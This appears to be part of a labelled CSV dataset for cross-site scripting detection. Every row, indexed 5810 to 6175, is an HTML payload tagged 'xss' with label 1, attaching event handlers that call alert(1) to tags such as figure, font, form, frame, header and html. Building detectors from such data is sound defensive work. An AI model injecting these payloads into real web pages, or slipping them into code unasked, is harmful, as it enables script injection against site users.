index,input,category,labels
5810,"<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>
",xss,1
5811,"<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
",xss,1
5812,"<figure id=x tabindex=1 onfocus=alert(1)></figure>
",xss,1
5813,"<figure id=x tabindex=1 onfocusin=alert(1)></figure>
",xss,1
5814,"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>
",xss,1
5815,"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>
",xss,1
5816,"<figure onbeforepaste=""alert(1)"" contenteditable>test</figure>
",xss,1
5817,"<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
",xss,1
5818,"<figure onclick=""alert(1)"">test</figure>
",xss,1
5819,"<figure oncontextmenu=""alert(1)"">test</figure>
",xss,1
5820,"<figure oncopy=""alert(1)"" contenteditable>test</figure>
",xss,1
5821,"<figure oncut=""alert(1)"" contenteditable>test</figure>
",xss,1
5822,"<figure ondblclick=""alert(1)"">test</figure>
",xss,1
5823,"<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>
",xss,1
5824,"<figure onkeydown=""alert(1)"" contenteditable>test</figure>
",xss,1
5825,"<figure onkeypress=""alert(1)"" contenteditable>test</figure>
",xss,1
5826,"<figure onkeyup=""alert(1)"" contenteditable>test</figure>
",xss,1
5827,"<figure onmousedown=""alert(1)"">test</figure>
",xss,1
5828,"<figure onmouseenter=""alert(1)"">test</figure>
",xss,1
5829,"<figure onmouseleave=""alert(1)"">test</figure>
",xss,1
5830,"<figure onmousemove=""alert(1)"">test</figure>
",xss,1
5831,"<figure onmouseout=""alert(1)"">test</figure>
",xss,1
5832,"<figure onmouseover=""alert(1)"">test</figure>
",xss,1
5833,"<figure onmouseup=""alert(1)"">test</figure>
",xss,1
5834,"<figure onpaste=""alert(1)"" contenteditable>test</figure>
",xss,1
5835,"<font draggable=""true"" ondrag=""alert(1)"">test</font>
",xss,1
5836,"<font draggable=""true"" ondragend=""alert(1)"">test</font>
",xss,1
5837,"<font draggable=""true"" ondragenter=""alert(1)"">test</font>
",xss,1
5838,"<font draggable=""true"" ondragleave=""alert(1)"">test</font>
",xss,1
5839,"<font draggable=""true"" ondragstart=""alert(1)"">test</font>
",xss,1
5840,"<font id=x tabindex=1 onactivate=alert(1)></font>
",xss,1
5841,"<font id=x tabindex=1 onbeforeactivate=alert(1)></font>
",xss,1
5842,"<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>
",xss,1
5843,"<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>
",xss,1
5844,"<font id=x tabindex=1 onfocus=alert(1)></font>
",xss,1
5845,"<font id=x tabindex=1 onfocusin=alert(1)></font>
",xss,1
5846,"<font onbeforecopy=""alert(1)"" contenteditable>test</font>
",xss,1
5847,"<font onbeforecut=""alert(1)"" contenteditable>test</font>
",xss,1
5848,"<font onbeforepaste=""alert(1)"" contenteditable>test</font>
",xss,1
5849,"<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>
",xss,1
5850,"<font onclick=""alert(1)"">test</font>
",xss,1
5851,"<font oncontextmenu=""alert(1)"">test</font>
",xss,1
5852,"<font oncopy=""alert(1)"" contenteditable>test</font>
",xss,1
5853,"<font oncut=""alert(1)"" contenteditable>test</font>
",xss,1
5854,"<font ondblclick=""alert(1)"">test</font>
",xss,1
5855,"<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>
",xss,1
5856,"<font onkeydown=""alert(1)"" contenteditable>test</font>
",xss,1
5857,"<font onkeypress=""alert(1)"" contenteditable>test</font>
",xss,1
5858,"<font onkeyup=""alert(1)"" contenteditable>test</font>
",xss,1
5859,"<font onmousedown=""alert(1)"">test</font>
",xss,1
5860,"<font onmouseenter=""alert(1)"">test</font>
",xss,1
5861,"<font onmouseleave=""alert(1)"">test</font>
",xss,1
5862,"<font onmousemove=""alert(1)"">test</font>
",xss,1
5863,"<font onmouseout=""alert(1)"">test</font>
",xss,1
5864,"<font onmouseover=""alert(1)"">test</font>
",xss,1
5865,"<font onmouseup=""alert(1)"">test</font>
",xss,1
5866,"<font onpaste=""alert(1)"" contenteditable>test</font>
",xss,1
5867,"<footer draggable=""true"" ondrag=""alert(1)"">test</footer>
",xss,1
5868,"<footer draggable=""true"" ondragend=""alert(1)"">test</footer>
",xss,1
5869,"<footer draggable=""true"" ondragenter=""alert(1)"">test</footer>
",xss,1
5870,"<footer draggable=""true"" ondragleave=""alert(1)"">test</footer>
",xss,1
5871,"<footer draggable=""true"" ondragstart=""alert(1)"">test</footer>
",xss,1
5872,"<footer id=x tabindex=1 onactivate=alert(1)></footer>
",xss,1
5873,"<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>
",xss,1
5874,"<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>
",xss,1
5875,"<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>
",xss,1
5876,"<footer id=x tabindex=1 onfocus=alert(1)></footer>
",xss,1
5877,"<footer id=x tabindex=1 onfocusin=alert(1)></footer>
",xss,1
5878,"<footer onbeforecopy=""alert(1)"" contenteditable>test</footer>
",xss,1
5879,"<footer onbeforecut=""alert(1)"" contenteditable>test</footer>
",xss,1
5880,"<footer onbeforepaste=""alert(1)"" contenteditable>test</footer>
",xss,1
5881,"<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>
",xss,1
5882,"<footer onclick=""alert(1)"">test</footer>
",xss,1
5883,"<footer oncontextmenu=""alert(1)"">test</footer>
",xss,1
5884,"<footer oncopy=""alert(1)"" contenteditable>test</footer>
",xss,1
5885,"<footer oncut=""alert(1)"" contenteditable>test</footer>
",xss,1
5886,"<footer ondblclick=""alert(1)"">test</footer>
",xss,1
5887,"<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>
",xss,1
5888,"<footer onkeydown=""alert(1)"" contenteditable>test</footer>
",xss,1
5889,"<footer onkeypress=""alert(1)"" contenteditable>test</footer>
",xss,1
5890,"<footer onkeyup=""alert(1)"" contenteditable>test</footer>
",xss,1
5891,"<footer onmousedown=""alert(1)"">test</footer>
",xss,1
5892,"<footer onmouseenter=""alert(1)"">test</footer>
",xss,1
5893,"<footer onmouseleave=""alert(1)"">test</footer>
",xss,1
5894,"<footer onmousemove=""alert(1)"">test</footer>
",xss,1
5895,"<footer onmouseout=""alert(1)"">test</footer>
",xss,1
5896,"<footer onmouseover=""alert(1)"">test</footer>
",xss,1
5897,"<footer onmouseup=""alert(1)"">test</footer>
",xss,1
5898,"<footer onpaste=""alert(1)"" contenteditable>test</footer>
",xss,1
5899,"<form draggable=""true"" ondrag=""alert(1)"">test</form>
",xss,1
5900,"<form draggable=""true"" ondragend=""alert(1)"">test</form>
",xss,1
5901,"<form draggable=""true"" ondragenter=""alert(1)"">test</form>
",xss,1
5902,"<form draggable=""true"" ondragleave=""alert(1)"">test</form>
",xss,1
5903,"<form draggable=""true"" ondragstart=""alert(1)"">test</form>
",xss,1
5904,"<form id=x tabindex=1 onactivate=alert(1)></form>
",xss,1
5905,"<form id=x tabindex=1 onbeforeactivate=alert(1)></form>
",xss,1
5906,"<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
",xss,1
5907,"<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>
",xss,1
5908,"<form id=x tabindex=1 onfocus=alert(1)></form>
",xss,1
5909,"<form id=x tabindex=1 onfocusin=alert(1)></form>
",xss,1
5910,"<form onbeforecopy=""alert(1)"" contenteditable>test</form>
",xss,1
5911,"<form onbeforecut=""alert(1)"" contenteditable>test</form>
",xss,1
5912,"<form onbeforepaste=""alert(1)"" contenteditable>test</form>
",xss,1
5913,"<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
",xss,1
5914,"<form onclick=""alert(1)"">test</form>
",xss,1
5915,"<form oncontextmenu=""alert(1)"">test</form>
",xss,1
5916,"<form oncopy=""alert(1)"" contenteditable>test</form>
",xss,1
5917,"<form oncut=""alert(1)"" contenteditable>test</form>
",xss,1
5918,"<form ondblclick=""alert(1)"">test</form>
",xss,1
5919,"<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
",xss,1
5920,"<form onkeydown=""alert(1)"" contenteditable>test</form>
",xss,1
5921,"<form onkeypress=""alert(1)"" contenteditable>test</form>
",xss,1
5922,"<form onkeyup=""alert(1)"" contenteditable>test</form>
",xss,1
5923,"<form onmousedown=""alert(1)"">test</form>
",xss,1
5924,"<form onmouseenter=""alert(1)"">test</form>
",xss,1
5925,"<form onmouseleave=""alert(1)"">test</form>
",xss,1
5926,"<form onmousemove=""alert(1)"">test</form>
",xss,1
5927,"<form onmouseout=""alert(1)"">test</form>
",xss,1
5928,"<form onmouseover=""alert(1)"">test</form>
",xss,1
5929,"<form onmouseup=""alert(1)"">test</form>
",xss,1
5930,"<form onpaste=""alert(1)"" contenteditable>test</form>
",xss,1
5931,"<form onreset=alert(1)><input type=reset>
",xss,1
5932,"<form onsubmit=alert(1)><input type=submit>
",xss,1
5933,"<form><input oninvalid=alert(1) required><input type=submit>
",xss,1
5934,"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>
",xss,1
5935,"<form><textarea oninvalid=alert(1) required><input type=submit>
",xss,1
5936,"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>
",xss,1
5937,"<frame draggable=""true"" ondragend=""alert(1)"">test</frame>
",xss,1
5938,"<frame draggable=""true"" ondragenter=""alert(1)"">test</frame>
",xss,1
5939,"<frame draggable=""true"" ondragleave=""alert(1)"">test</frame>
",xss,1
5940,"<frame draggable=""true"" ondragstart=""alert(1)"">test</frame>
",xss,1
5941,"<frame id=x tabindex=1 onactivate=alert(1)></frame>
",xss,1
5942,"<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>
",xss,1
5943,"<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>
",xss,1
5944,"<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>
",xss,1
5945,"<frame onbeforecopy=""alert(1)"" contenteditable>test</frame>
",xss,1
5946,"<frame onbeforecut=""alert(1)"" contenteditable>test</frame>
",xss,1
5947,"<frame onbeforepaste=""alert(1)"" contenteditable>test</frame>
",xss,1
5948,"<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>
",xss,1
5949,"<frame onclick=""alert(1)"">test</frame>
",xss,1
5950,"<frame oncontextmenu=""alert(1)"">test</frame>
",xss,1
5951,"<frame oncopy=""alert(1)"" contenteditable>test</frame>
",xss,1
5952,"<frame oncut=""alert(1)"" contenteditable>test</frame>
",xss,1
5953,"<frame ondblclick=""alert(1)"">test</frame>
",xss,1
5954,"<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>
",xss,1
5955,"<frame onkeydown=""alert(1)"" contenteditable>test</frame>
",xss,1
5956,"<frame onkeypress=""alert(1)"" contenteditable>test</frame>
",xss,1
5957,"<frame onkeyup=""alert(1)"" contenteditable>test</frame>
",xss,1
5958,"<frame onmousedown=""alert(1)"">test</frame>
",xss,1
5959,"<frame onmouseenter=""alert(1)"">test</frame>
",xss,1
5960,"<frame onmouseleave=""alert(1)"">test</frame>
",xss,1
5961,"<frame onmousemove=""alert(1)"">test</frame>
",xss,1
5962,"<frame onmouseout=""alert(1)"">test</frame>
",xss,1
5963,"<frame onmouseover=""alert(1)"">test</frame>
",xss,1
5964,"<frame onmouseup=""alert(1)"">test</frame>
",xss,1
5965,"<frame onpaste=""alert(1)"" contenteditable>test</frame>
",xss,1
5966,"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>
",xss,1
5967,"<frameset draggable=""true"" ondragend=""alert(1)"">test</frameset>
",xss,1
5968,"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>
",xss,1
5969,"<frameset draggable=""true"" ondragleave=""alert(1)"">test</frameset>
",xss,1
5970,"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>
",xss,1
5971,"<frameset id=x tabindex=1 onactivate=alert(1)></frameset>
",xss,1
5972,"<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>
",xss,1
5973,"<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>
",xss,1
5974,"<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>
",xss,1
5975,"<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
",xss,1
5976,"<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
",xss,1
5977,"<frameset onbeforecopy=""alert(1)"" contenteditable>test</frameset>
",xss,1
5978,"<frameset onbeforecut=""alert(1)"" contenteditable>test</frameset>
",xss,1
5979,"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>
",xss,1
5980,"<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>
",xss,1
5981,"<frameset onclick=""alert(1)"">test</frameset>
",xss,1
5982,"<frameset oncontextmenu=""alert(1)"">test</frameset>
",xss,1
5983,"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>
",xss,1
5984,"<frameset oncut=""alert(1)"" contenteditable>test</frameset>
",xss,1
5985,"<frameset ondblclick=""alert(1)"">test</frameset>
",xss,1
5986,"<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>
",xss,1
5987,"<frameset onkeydown=""alert(1)"" contenteditable>test</frameset>
",xss,1
5988,"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>
",xss,1
5989,"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>
",xss,1
5990,"<frameset onmousedown=""alert(1)"">test</frameset>
",xss,1
5991,"<frameset onmouseenter=""alert(1)"">test</frameset>
",xss,1
5992,"<frameset onmouseleave=""alert(1)"">test</frameset>
",xss,1
5993,"<frameset onmousemove=""alert(1)"">test</frameset>
",xss,1
5994,"<frameset onmouseout=""alert(1)"">test</frameset>
",xss,1
5995,"<frameset onmouseover=""alert(1)"">test</frameset>
",xss,1
5996,"<frameset onmouseup=""alert(1)"">test</frameset>
",xss,1
5997,"<frameset onpageshow=alert(1)>
",xss,1
5998,"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>
",xss,1
5999,"<frameset><frame id=x onfocus=alert(1)>
",xss,1
6000,"<frameset><frame id=x onfocusin=alert(1)>
",xss,1
6001,"<frameset><frame onload=alert(1)>
",xss,1
6002,"<h1 draggable=""true"" ondrag=""alert(1)"">test</h1>
",xss,1
6003,"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>
",xss,1
6004,"<h1 draggable=""true"" ondragenter=""alert(1)"">test</h1>
",xss,1
6005,"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>
",xss,1
6006,"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>
",xss,1
6007,"<h1 id=x tabindex=1 onactivate=alert(1)></h1>
",xss,1
6008,"<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
",xss,1
6009,"<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>
",xss,1
6010,"<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>
",xss,1
6011,"<h1 id=x tabindex=1 onfocus=alert(1)></h1>
",xss,1
6012,"<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
",xss,1
6013,"<h1 onbeforecopy=""alert(1)"" contenteditable>test</h1>
",xss,1
6014,"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>
",xss,1
6015,"<h1 onbeforepaste=""alert(1)"" contenteditable>test</h1>
",xss,1
6016,"<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
",xss,1
6017,"<h1 onclick=""alert(1)"">test</h1>
",xss,1
6018,"<h1 oncontextmenu=""alert(1)"">test</h1>
",xss,1
6019,"<h1 oncopy=""alert(1)"" contenteditable>test</h1>
",xss,1
6020,"<h1 oncut=""alert(1)"" contenteditable>test</h1>
",xss,1
6021,"<h1 ondblclick=""alert(1)"">test</h1>
",xss,1
6022,"<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
",xss,1
6023,"<h1 onkeydown=""alert(1)"" contenteditable>test</h1>
",xss,1
6024,"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>
",xss,1
6025,"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>
",xss,1
6026,"<h1 onmousedown=""alert(1)"">test</h1>
",xss,1
6027,"<h1 onmouseenter=""alert(1)"">test</h1>
",xss,1
6028,"<h1 onmouseleave=""alert(1)"">test</h1>
",xss,1
6029,"<h1 onmousemove=""alert(1)"">test</h1>
",xss,1
6030,"<h1 onmouseout=""alert(1)"">test</h1>
",xss,1
6031,"<h1 onmouseover=""alert(1)"">test</h1>
",xss,1
6032,"<h1 onmouseup=""alert(1)"">test</h1>
",xss,1
6033,"<h1 onpaste=""alert(1)"" contenteditable>test</h1>
",xss,1
6034,"<head draggable=""true"" ondrag=""alert(1)"">test</head>
",xss,1
6035,"<head draggable=""true"" ondragend=""alert(1)"">test</head>
",xss,1
6036,"<head draggable=""true"" ondragenter=""alert(1)"">test</head>
",xss,1
6037,"<head draggable=""true"" ondragleave=""alert(1)"">test</head>
",xss,1
6038,"<head draggable=""true"" ondragstart=""alert(1)"">test</head>
",xss,1
6039,"<head id=x tabindex=1 onactivate=alert(1)></head>
",xss,1
6040,"<head id=x tabindex=1 onbeforeactivate=alert(1)></head>
",xss,1
6041,"<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>
",xss,1
6042,"<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>
",xss,1
6043,"<head id=x tabindex=1 onfocus=alert(1)></head>
",xss,1
6044,"<head id=x tabindex=1 onfocusin=alert(1)></head>
",xss,1
6045,"<head onbeforecopy=""alert(1)"" contenteditable>test</head>
",xss,1
6046,"<head onbeforecut=""alert(1)"" contenteditable>test</head>
",xss,1
6047,"<head onbeforepaste=""alert(1)"" contenteditable>test</head>
",xss,1
6048,"<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>
",xss,1
6049,"<head onclick=""alert(1)"">test</head>
",xss,1
6050,"<head oncontextmenu=""alert(1)"">test</head>
",xss,1
6051,"<head oncopy=""alert(1)"" contenteditable>test</head>
",xss,1
6052,"<head oncut=""alert(1)"" contenteditable>test</head>
",xss,1
6053,"<head ondblclick=""alert(1)"">test</head>
",xss,1
6054,"<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>
",xss,1
6055,"<head onkeydown=""alert(1)"" contenteditable>test</head>
",xss,1
6056,"<head onkeypress=""alert(1)"" contenteditable>test</head>
",xss,1
6057,"<head onkeyup=""alert(1)"" contenteditable>test</head>
",xss,1
6058,"<head onmousedown=""alert(1)"">test</head>
",xss,1
6059,"<head onmouseenter=""alert(1)"">test</head>
",xss,1
6060,"<head onmouseleave=""alert(1)"">test</head>
",xss,1
6061,"<head onmousemove=""alert(1)"">test</head>
",xss,1
6062,"<head onmouseout=""alert(1)"">test</head>
",xss,1
6063,"<head onmouseover=""alert(1)"">test</head>
",xss,1
6064,"<head onmouseup=""alert(1)"">test</head>
",xss,1
6065,"<head onpaste=""alert(1)"" contenteditable>test</head>
",xss,1
6066,"<header draggable=""true"" ondrag=""alert(1)"">test</header>
",xss,1
6067,"<header draggable=""true"" ondragend=""alert(1)"">test</header>
",xss,1
6068,"<header draggable=""true"" ondragenter=""alert(1)"">test</header>
",xss,1
6069,"<header draggable=""true"" ondragleave=""alert(1)"">test</header>
",xss,1
6070,"<header draggable=""true"" ondragstart=""alert(1)"">test</header>
",xss,1
6071,"<header id=x tabindex=1 onactivate=alert(1)></header>
",xss,1
6072,"<header id=x tabindex=1 onbeforeactivate=alert(1)></header>
",xss,1
6073,"<header id=x tabindex=1 onbeforedeactivate=alert(1)></header><input autofocus>
",xss,1
6074,"<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>
",xss,1
6075,"<header id=x tabindex=1 onfocus=alert(1)></header>
",xss,1
6076,"<header id=x tabindex=1 onfocusin=alert(1)></header>
",xss,1
6077,"<header onbeforecopy=""alert(1)"" contenteditable>test</header>
",xss,1
6078,"<header onbeforecut=""alert(1)"" contenteditable>test</header>
",xss,1
6079,"<header onbeforepaste=""alert(1)"" contenteditable>test</header>
",xss,1
6080,"<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>
",xss,1
6081,"<header onclick=""alert(1)"">test</header>
",xss,1
6082,"<header oncontextmenu=""alert(1)"">test</header>
",xss,1
6083,"<header oncopy=""alert(1)"" contenteditable>test</header>
",xss,1
6084,"<header oncut=""alert(1)"" contenteditable>test</header>
",xss,1
6085,"<header ondblclick=""alert(1)"">test</header>
",xss,1
6086,"<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>
",xss,1
6087,"<header onkeydown=""alert(1)"" contenteditable>test</header>
",xss,1
6088,"<header onkeypress=""alert(1)"" contenteditable>test</header>
",xss,1
6089,"<header onkeyup=""alert(1)"" contenteditable>test</header>
",xss,1
6090,"<header onmousedown=""alert(1)"">test</header>
",xss,1
6091,"<header onmouseenter=""alert(1)"">test</header>
",xss,1
6092,"<header onmouseleave=""alert(1)"">test</header>
",xss,1
6093,"<header onmousemove=""alert(1)"">test</header>
",xss,1
6094,"<header onmouseout=""alert(1)"">test</header>
",xss,1
6095,"<header onmouseover=""alert(1)"">test</header>
",xss,1
6096,"<header onmouseup=""alert(1)"">test</header>
",xss,1
6097,"<header onpaste=""alert(1)"" contenteditable>test</header>
",xss,1
6098,"<hgroup draggable=""true"" ondrag=""alert(1)"">test</hgroup>
",xss,1
6099,"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>
",xss,1
6100,"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>
",xss,1
6101,"<hgroup draggable=""true"" ondragleave=""alert(1)"">test</hgroup>
",xss,1
6102,"<hgroup draggable=""true"" ondragstart=""alert(1)"">test</hgroup>
",xss,1
6103,"<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>
",xss,1
6104,"<hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>
",xss,1
6105,"<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>
",xss,1
6106,"<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>
",xss,1
6107,"<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
",xss,1
6108,"<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
",xss,1
6109,"<hgroup onbeforecopy=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6110,"<hgroup onbeforecut=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6111,"<hgroup onbeforepaste=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6112,"<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>
",xss,1
6113,"<hgroup onclick=""alert(1)"">test</hgroup>
",xss,1
6114,"<hgroup oncontextmenu=""alert(1)"">test</hgroup>
",xss,1
6115,"<hgroup oncopy=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6116,"<hgroup oncut=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6117,"<hgroup ondblclick=""alert(1)"">test</hgroup>
",xss,1
6118,"<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>
",xss,1
6119,"<hgroup onkeydown=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6120,"<hgroup onkeypress=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6121,"<hgroup onkeyup=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6122,"<hgroup onmousedown=""alert(1)"">test</hgroup>
",xss,1
6123,"<hgroup onmouseenter=""alert(1)"">test</hgroup>
",xss,1
6124,"<hgroup onmouseleave=""alert(1)"">test</hgroup>
",xss,1
6125,"<hgroup onmousemove=""alert(1)"">test</hgroup>
",xss,1
6126,"<hgroup onmouseout=""alert(1)"">test</hgroup>
",xss,1
6127,"<hgroup onmouseover=""alert(1)"">test</hgroup>
",xss,1
6128,"<hgroup onmouseup=""alert(1)"">test</hgroup>
",xss,1
6129,"<hgroup onpaste=""alert(1)"" contenteditable>test</hgroup>
",xss,1
6130,"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>
",xss,1
6131,"<hr draggable=""true"" ondragend=""alert(1)"">test</hr>
",xss,1
6132,"<hr draggable=""true"" ondragenter=""alert(1)"">test</hr>
",xss,1
6133,"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>
",xss,1
6134,"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>
",xss,1
6135,"<hr id=x tabindex=1 onactivate=alert(1)></hr>
",xss,1
6136,"<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>
",xss,1
6137,"<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>
",xss,1
6138,"<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>
",xss,1
6139,"<hr id=x tabindex=1 onfocus=alert(1)></hr>
",xss,1
6140,"<hr id=x tabindex=1 onfocusin=alert(1)></hr>
",xss,1
6141,"<hr onbeforecopy=""alert(1)"" contenteditable>test</hr>
",xss,1
6142,"<hr onbeforecut=""alert(1)"" contenteditable>test</hr>
",xss,1
6143,"<hr onbeforepaste=""alert(1)"" contenteditable>test</hr>
",xss,1
6144,"<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>
",xss,1
6145,"<hr onclick=""alert(1)"">test</hr>
",xss,1
6146,"<hr oncontextmenu=""alert(1)"">test</hr>
",xss,1
6147,"<hr oncopy=""alert(1)"" contenteditable>test</hr>
",xss,1
6148,"<hr oncut=""alert(1)"" contenteditable>test</hr>
",xss,1
6149,"<hr ondblclick=""alert(1)"">test</hr>
",xss,1
6150,"<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>
",xss,1
6151,"<hr onkeydown=""alert(1)"" contenteditable>test</hr>
",xss,1
6152,"<hr onkeypress=""alert(1)"" contenteditable>test</hr>
",xss,1
6153,"<hr onkeyup=""alert(1)"" contenteditable>test</hr>
",xss,1
6154,"<hr onmousedown=""alert(1)"">test</hr>
",xss,1
6155,"<hr onmouseenter=""alert(1)"">test</hr>
",xss,1
6156,"<hr onmouseleave=""alert(1)"">test</hr>
",xss,1
6157,"<hr onmousemove=""alert(1)"">test</hr>
",xss,1
6158,"<hr onmouseout=""alert(1)"">test</hr>
",xss,1
6159,"<hr onmouseover=""alert(1)"">test</hr>
",xss,1
6160,"<hr onmouseup=""alert(1)"">test</hr>
",xss,1
6161,"<hr onpaste=""alert(1)"" contenteditable>test</hr>
",xss,1
6162,"<html draggable=""true"" ondrag=""alert(1)"">test</html>
",xss,1
6163,"<html draggable=""true"" ondragend=""alert(1)"">test</html>
",xss,1
6164,"<html draggable=""true"" ondragenter=""alert(1)"">test</html>
",xss,1
6165,"<html draggable=""true"" ondragleave=""alert(1)"">test</html>
",xss,1
6166,"<html draggable=""true"" ondragstart=""alert(1)"">test</html>
",xss,1
6167,"<html id=x tabindex=1 onactivate=alert(1)></html>
",xss,1
6168,"<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
",xss,1
6169,"<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
",xss,1
6170,"<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
",xss,1
6171,"<html id=x tabindex=1 onfocus=alert(1)></html>
",xss,1
6172,"<html id=x tabindex=1 onfocusin=alert(1)></html>
",xss,1
6173,"<html onbeforecopy=""alert(1)"" contenteditable>test</html>
",xss,1
6174,"<html onbeforecut=""alert(1)"" contenteditable>test</html>
",xss,1
6175,"<html onbeforepaste=""alert(1)"" contenteditable>test</html>
",xss,1
